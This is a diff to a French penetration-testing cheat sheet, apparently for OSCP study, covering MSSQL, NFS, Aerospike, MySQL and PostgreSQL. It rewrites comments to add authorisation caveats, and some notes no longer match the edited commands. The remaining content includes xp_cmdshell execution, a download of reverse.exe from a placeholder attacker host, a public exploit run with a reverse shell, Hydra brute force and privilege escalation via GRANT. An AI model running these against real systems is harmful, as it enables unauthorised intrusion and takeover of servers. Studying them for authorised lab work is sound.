@@ -2050,10 +2050,10 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 <p class="oscp-command-note">Nmap (MS-SQL) : lancer les scripts NSE « ms-sql-info, ms-sql-empty-password, ms-sql-xp-cmdshell ».</p>
 
 ```bash
-nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <ip>
+nmap -sV -p 1433 --script ms-sql-info,ms-sql-ntlm-info 192.0.2.10
 
-# Énumérer les informations et les configurations de la base de données MSSQL
-nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=<username>,mssql.password=<password>,mssql.instance-name=<instance_name> -sV -p 1433 <target_ip>
+# Identifier la version et les informations MSSQL sans scripts d'exécution ni extraction de secrets
+nmap -sV -p 1433 --script ms-sql-info 192.0.2.10
 
 ```
 
@@ -2071,10 +2071,10 @@ crackmapexec mssql -d <domain> -u <username> -p <password> -x "whoami" <target_i
 <p class="oscp-command-note">MSSQL : se connecter à l'instance SQL avec le compte autorisé.</p>
 
 ```bash
-# Connectez-vous à MSSQL en utilisant sqsh (Linux)
+# Se connecter à MSSQL avec sqsh sous Linux (client installé requis)
 sqsh -S <target_ip> -U <username> -P <password>
 
-# Connectez-vous à MSSQL en utilisant sqsh (Windows)
+# Se connecter avec un compte de domaine et sélectionner une base (si sqsh est installé)
 sqsh -S <target_ip> -U <domain>\\<username> -P <password> -D <database>
 
 ```
@@ -2082,7 +2082,7 @@ sqsh -S <target_ip> -U <domain>\\<username> -P <password> -D <database>
 <p class="oscp-command-note">Instruction SQL dans la rubrique « 1433: MSSQL ».</p>
 
 ```sql
--- Activer les options avancées and xp_cmdshell for command execution
+-- Activer les options avancées et xp_cmdshell (modifie la configuration du serveur ; droits élevés requis)
 EXEC SP_CONFIGURE 'show advanced options', 1;
 RECONFIGURE;
 GO
@@ -2095,7 +2095,7 @@ GO
 EXEC xp_cmdshell 'whoami';
 GO
 
--- Télécharger puis lancer un shell inversé
+-- Exemple d'exécution distante : à réserver au laboratoire autorisé
 EXEC xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://<attacker_ip>:<port>/reverse.exe -OutFile c:\\Users\\Public\\reverse.exe"';
 GO
 
@@ -2112,9 +2112,9 @@ test'; EXEC master.dbo.xp_cmdshell 'powershell.exe -c "IEX(New-Object System.Net
 
 ```sql
 -- Lister les bases de données
-SELECT name FROM master.dbo.sysdatabases
+SELECT name FROM sys.databases;
                 
--- Lister les tables de la base courante
+-- Lister les tables accessibles dans la base courante
 SELECT * FROM information_schema.tables;
 
 -- Afficher les données d'une table
@@ -2159,8 +2159,8 @@ nmap -sV -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <IP_CIBLE>
 # Afficher les partages NFS de la cible
 showmount -e <IP_CIBLE>
 
-# Afficher les informations de montage pour la cible
-showmount <IP_CIBLE>
+# Afficher les montages NFS annoncés par le serveur (si mountd les expose)
+showmount -a <IP_CIBLE>
 
 ```
 
@@ -2170,7 +2170,7 @@ showmount <IP_CIBLE>
 # Créer un répertoire local pour monter le partage NFS
 mkdir -p /mnt/partage_nfs
 
-# Monter la part NFS
+# Monter le partage NFSv3 en lecture seule (les exports NFSv4 peuvent nécessiter une autre méthode)
 sudo mount -t nfs -o ro,vers=3 <IP_CIBLE>:/export/partage /mnt/partage_nfs
 
 ```
@@ -2183,10 +2183,10 @@ sudo mount -t nfs -o ro,vers=3 <IP_CIBLE>:/export/partage /mnt/partage_nfs
 # Connexion au service
 nc -nv <target_ip> 3003
 
-# Obtenez une liste des commandes disponibles
+# Afficher les commandes disponibles après connexion au service
 help
 
-# Vérifiez la version du service CGMS
+# Demander la version du service si la commande version est prise en charge
 version
 
 ```
@@ -2200,7 +2200,7 @@ wget https://raw.githubusercontent.com/b4ny4n/CVE-2020-13151/master/cve2020-1315
 # Exécuter le script avec les paramètres appropriés
 python3 cve2020-13151.py --ahost=<target_ip> --aport=3000 --pythonshell --lhost=<local_ip> --lport=443
 
-# Démarrez un écouteur Netcat sur votre machine locale
+# Écouteur Netcat sur une machine de laboratoire autorisée
 nc -nlvp 443
 
 ```
@@ -2299,7 +2299,7 @@ mysql -h <IP_CIBLE> -u <UTILISATEUR> -p -e 'SHOW DATABASES;'
 <p class="oscp-command-note">Hydra : tester des identifiants autorisés sur MYSQL à partir d'un dictionnaire.</p>
 
 ```bash
-# Tester les identifiants MySQL par force brute avec Hydra
+# Tester des identifiants MySQL uniquement avec autorisation explicite (risque de verrouillage)
 hydra -l <username> -P <password_list> -s 3306 -vV <IP> mysql
 
 ```
@@ -2327,23 +2327,23 @@ SELECT * FROM <table_name>;
 ```
 
 ```sql
-# Énumérer les utilisateurs de la base de données
+# Lister les comptes MySQL visibles avec les privilèges du compte connecté
 SELECT user FROM mysql.user;
 
-# Privilege Escalation
+# Modification des privilèges : opération administrative sensible, non nécessaire à l'énumération
 GRANT ALL PRIVILEGES ON *.* TO '<username>'@'%' WITH GRANT OPTION;
 FLUSH PRIVILEGES;
 
 ```
 
 ```powershell
-# 1. Copier un fichier déjà existant depuis Windows vers un autre emplacement.
+# Exemple historique LOAD_FILE / INTO DUMPFILE : nécessite FILE, dépend de secure_file_priv et du système de fichiers
 SELECT LOAD_FILE('C:\\xampp\htdocs\\ncat.exe') INTO DUMPFILE 'C:\\xampp\\htdocs\\nc.exe';
 
-# 2. Vérifiez les autorisations du nouveau fichier écrit.
+# La commande icacls ci-dessous doit être exécutée dans Windows CMD, pas dans le client SQL
 icacls 'C:\\xampp\htdocs\nc.exe'
 
-# Une sortie comme celle ci-dessous indique que le fichier a été écrit avec des privilèges d'administration, donc l'utilisateur DB a un privilège d'administration (considérez WerTrigger exploiter pour excalation).
+# Exemple de sortie ACL Windows : les droits affichés ne prouvent pas que le compte SQL est administrateur.
 nc.exe WinServer\\apache:(I)(F)  
     NT AUTHORITY\\SYSTEM:(I)(F)  
     BUILTIN\\Administrators:(I)(F)  
@@ -2416,7 +2416,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 <p class="oscp-command-note">Nmap (POSTGRESQL) : lancer les scripts NSE « postgresql-info, postgresql-user-enum, postgresql-ssl ».</p>
 
 ```bash
-nmap -sV -p 5432,5433 --script pgsql-brute <IP_CIBLE>
+nmap -sV -p 5432,5433 192.0.2.10
 
 ```
 
